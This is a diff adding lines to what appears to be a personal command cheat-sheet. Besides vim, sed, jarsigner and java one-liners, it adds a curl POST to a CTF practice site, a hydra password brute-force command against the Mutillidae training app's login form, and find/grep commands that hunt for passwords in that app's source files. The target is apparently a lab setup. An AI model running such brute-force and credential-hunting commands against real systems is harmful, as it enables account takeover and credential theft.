@@ -21,3 +21,8 @@ vim >>> au BufRead *.c map <buffer> <F10> :w<CR>:!gcc % &&./a.out <CR>
 sed -e 's/\-[[:digit:]].*//'   	/* del gentoo package '-release' and other */
 sed -e 's/\-[[:digit:]].*\s/ /'	/* del gentoo package '-release' only! */
 jarsigner -verbose -keystore xxx.keystore -signedjar app.apk app-unsigned.apk xxx.keystore
+java -classpath /home/pl/eclipse-workspace/chapter01/bin/ cn/itcast/chapter01/HelloWorld
+curl -v -X POST http://ctf5.shiyanbar.com/web/jiandan/index.php -d "id=222&submit=Login"
+hydra -l kevin -P passwd/password-4.dic -f 192.168.0.113 http-form-post "/mutillidae/index.php?page=login.php:username=^USER^&password=^PASS^&login-php-submit-button=Login:Account does not exist"
+find /www/mutillidae -name "*.php" | xargs grep -i "password" | grep "="
+find /www/mutillidae -name 'MySQLHandler.php' | xargs cat | sed 's/</\&#60;/g' | sed 's/>/\&#62;/g'
